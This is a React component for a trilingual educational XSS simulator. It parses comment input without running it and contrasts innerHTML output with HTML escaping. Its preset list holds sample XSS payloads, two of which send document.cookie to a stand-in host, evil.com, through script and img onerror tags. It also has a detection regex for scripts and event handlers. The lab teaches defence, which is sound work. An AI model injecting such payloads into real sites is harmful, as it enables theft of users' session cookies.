import { useEffect, useState } from 'react';
import { LabFrame, SecStyles, Segmented, Verdict, tr, type L, type Lang } from './ui';

/**
 * Type a comment and see how the browser would treat it with innerHTML vs
 * escaped output. Nothing here is ever rendered as live HTML: the input is
 * only parsed with DOMParser (an inert document where scripts and event
 * handlers never run) to list what *would* execute.
 */

const T: Record<string, L> = {
  title: { zh: '留言板 XSS 模擬器', en: 'Comment box XSS simulator', de: 'XSS-Simulator fürs Kommentarfeld' },
  hint: {
    zh: '輸入一則留言，切換兩種輸出方式，看看瀏覽器會怎麼對待它。這裡只做解析，不會真的執行。',
    en: 'Type a comment and switch between the two ways of outputting it. The input is only analysed here, never executed.',
    de: 'Gib einen Kommentar ein und wechsle zwischen den zwei Ausgabearten. Hier wird nur analysiert, nichts ausgeführt.',
  },
  presets: { zh: '試試這些：', en: 'Try these:', de: 'Probier diese:' },
  input: { zh: '留言內容', en: 'Comment', de: 'Kommentar' },
  mode: { zh: '輸出方式', en: 'Output', de: 'Ausgabe' },
  unsafe: { zh: "innerHTML = comment（不安全）", en: 'innerHTML = comment (unsafe)', de: 'innerHTML = comment (unsicher)' },
  safe: { zh: 'escapeHtml(comment)（安全）', en: 'escapeHtml(comment) (safe)', de: 'escapeHtml(comment) (sicher)' },
  seen: { zh: '瀏覽器拿到的 HTML', en: 'HTML the browser receives', de: 'HTML, das der Browser bekommt' },
  runs: { zh: '會被執行：', en: 'Would execute:', de: 'Würde ausgeführt:' },
  leak: {
    zh: '→ 其他使用者一打開頁面，Cookie 就被送去 evil.com',
    en: '→ As soon as someone opens the page, their cookie goes to evil.com',
    de: '→ Sobald jemand die Seite öffnet, geht sein Cookie an evil.com',
  },
  harmless: {
    zh: '這段剛好沒有可執行的內容，但只要換一段輸入就會出事：innerHTML 不檢查任何東西。',
    en: 'Nothing executable this time, but the next input could be. innerHTML checks nothing.',
    de: 'Diesmal nichts Ausführbares, aber die nächste Eingabe kann es sein. innerHTML prüft nichts.',
  },
  shown: {
    zh: '所有 < > " \' & 都變成實體字元，瀏覽器只會把它當文字顯示，沒有任何東西會執行。',
    en: 'Every < > " \' & becomes an entity. The browser shows it as text and nothing runs.',
    de: 'Jedes < > " \' & wird zur Entity. Der Browser zeigt nur Text, nichts läuft.',
  },
  script: { zh: '<script> 標籤', en: '<script> tag', de: '<script>-Tag' },
  handler: { zh: '事件處理器', en: 'event handler', de: 'Event-Handler' },
  jsurl: { zh: 'javascript: 連結', en: 'javascript: URL', de: 'javascript:-URL' },
  frame: { zh: '可載入外部內容的', en: 'embeds external content:', de: 'lädt externe Inhalte:' },
};

const PRESETS = [
  `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>`,
  `<img src=x onerror="fetch('//evil.com?c='+document.cookie)">`,
  `<a href="javascript:alert(document.cookie)">🎁 free gift</a>`,
  `<svg onload=alert(1)>`,
  `Nice post! <b>Thanks</b> 🙌`,
];

const MAX = 400;

function escapeHtml(s: string) {
  return s.replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[c]!);
}

type Finding = { kind: 'script' | 'handler' | 'jsurl' | 'frame'; detail: string };

function analyse(html: string): Finding[] {
  const doc = new DOMParser().parseFromString(`<body>${html}</body>`, 'text/html');
  const out: Finding[] = [];
  doc.body.querySelectorAll('*').forEach((el) => {
    const tag = el.tagName.toLowerCase();
    if (tag === 'script') out.push({ kind: 'script', detail: (el.textContent || '').trim().slice(0, 60) || '<script>' });
    if (['iframe', 'object', 'embed'].includes(tag)) out.push({ kind: 'frame', detail: `<${tag}>` });
    for (const attr of Array.from(el.attributes)) {
      const name = attr.name.toLowerCase();
      if (name.startsWith('on')) out.push({ kind: 'handler', detail: `${name}="${attr.value.slice(0, 50)}"` });
      if (['href', 'src', 'action', 'formaction', 'xlink:href'].includes(name) && /^\s*javascript:/i.test(attr.value))
        out.push({ kind: 'jsurl', detail: `${name}="${attr.value.slice(0, 50)}"` });
    }
  });
  return out;
}

const DANGER = /(<script[\s\S]*?(?:<\/script>|$)|\son\w+\s*=\s*(?:"[^"]*"|'[^']*'|[^\s>]+)|javascript:|<(?:iframe|object|embed)\b)/gi;

function Highlight({ src }: { src: string }) {
  const parts = src.split(DANGER);
  return (
    <>
      {parts.map((p, i) =>
        i % 2 === 1 ? (
          <mark key={i} className="bg-[#E43B44] px-0.5 text-[#FFFFFF]">
            {p}
          </mark>
        ) : (
          <span key={i}>{p}</span>
        )
      )}
    </>
  );
}

function Entities({ src }: { src: string }) {
  const parts = src.split(/(&amp;|&lt;|&gt;|&quot;|&#39;)/);
  return (
    <>
      {parts.map((p, i) =>
        i % 2 === 1 ? (
          <span key={i} className="bg-[#FFC93C] px-0.5 text-[#222034]">
            {p}
          </span>
        ) : (
          <span key={i}>{p}</span>
        )
      )}
    </>
  );
}

export default function XssLab({ lang = 'en' }: { lang?: Lang }) {
  const [value, setValue] = useState(PRESETS[1]);
  const [mode, setMode] = useState<'unsafe' | 'safe'>('unsafe');
  const [findings, setFindings] = useState<Finding[] | null>(null);

  useEffect(() => {
    if (typeof DOMParser === 'undefined') return;
    setFindings(analyse(value));
  }, [value]);

  const label = (f: Finding) => tr(T[f.kind], lang);

  return (
    <LabFrame lang={lang} title={tr(T.title, lang)} hint={tr(T.hint, lang)} testId="lab-xss">
      <SecStyles />
      <div className="mb-2 flex flex-wrap items-center gap-1.5">
        <span className="text-xs font-bold text-[#4B3F72]">{tr(T.presets, lang)}</span>
        {PRESETS.map((p, i) => (
          <button
            key={i}
            type="button"
            onClick={() => setValue(p)}
            className="max-w-[220px] truncate border-2 border-[#222034] bg-[#FFF4D6] px-2 py-1 font-mono text-[11px] shadow-[2px_2px_0_#222034] hover:bg-white"
            title={p}
          >
            {p}
          </button>
        ))}
      </div>
      <label className="mb-1 block text-xs font-extrabold uppercase tracking-[0.06em]" htmlFor="xss-input">
        {tr(T.input, lang)}
      </label>
      <textarea
        id="xss-input"
        data-testid="xss-input"
        value={value}
        maxLength={MAX}
        onChange={(e) => setValue(e.target.value.slice(0, MAX))}
        rows={3}
        spellCheck={false}
        className="w-full resize-y border-2 border-[#222034] bg-white p-2 font-mono text-[13px] leading-relaxed text-[#222034] focus:outline-none focus:ring-2 focus:ring-[#FFC93C]"
      />
      <div className="mt-1 text-right text-[11px] text-[#5A4E7C]">
        {value.length} / {MAX}
      </div>

      <div className="mt-2">
        <Segmented
          label={tr(T.mode, lang)}
          value={mode}
          onChange={setMode}
          options={[
            { value: 'unsafe', label: tr(T.unsafe, lang) },
            { value: 'safe', label: tr(T.safe, lang) },
          ]}
        />
      </div>

      <div className="mt-3 border-2 border-[#4A4E9C] bg-[#16183A] p-3 text-[#F5F1FF]">
        <div className="mb-1 text-[10px] font-extrabold uppercase tracking-[0.08em] text-[#A9ACE6]">
          {tr(T.seen, lang)}
        </div>
        <div className="m-0 whitespace-pre-wrap break-all font-mono text-[12.5px] leading-relaxed" data-testid="xss-output">
          {'<div class="comment">'}
          {mode === 'unsafe' ? <Highlight src={value} /> : <Entities src={escapeHtml(value)} />}
          {'</div>'}
        </div>
      </div>

      <div className="mt-3" data-testid="xss-verdict">
        {mode === 'safe' ? (
          <Verdict tone="good">✓ {tr(T.shown, lang)}</Verdict>
        ) : findings === null ? null : findings.length ? (
          <Verdict tone="bad">
            <div>✗ {tr(T.runs, lang)}</div>
            <ul className="m-0 mt-1 list-none space-y-0.5 p-0 font-mono text-[12px] font-medium">
              {findings.slice(0, 6).map((f, i) => (
                <li key={i}>
                  • {label(f)} <span className="opacity-80">{f.detail}</span>
                </li>
              ))}
            </ul>
            <div className="mt-1">{tr(T.leak, lang)}</div>
          </Verdict>
        ) : (
          <Verdict tone="warn">⚠ {tr(T.harmless, lang)}</Verdict>
        )}
      </div>
    </LabFrame>
  );
}
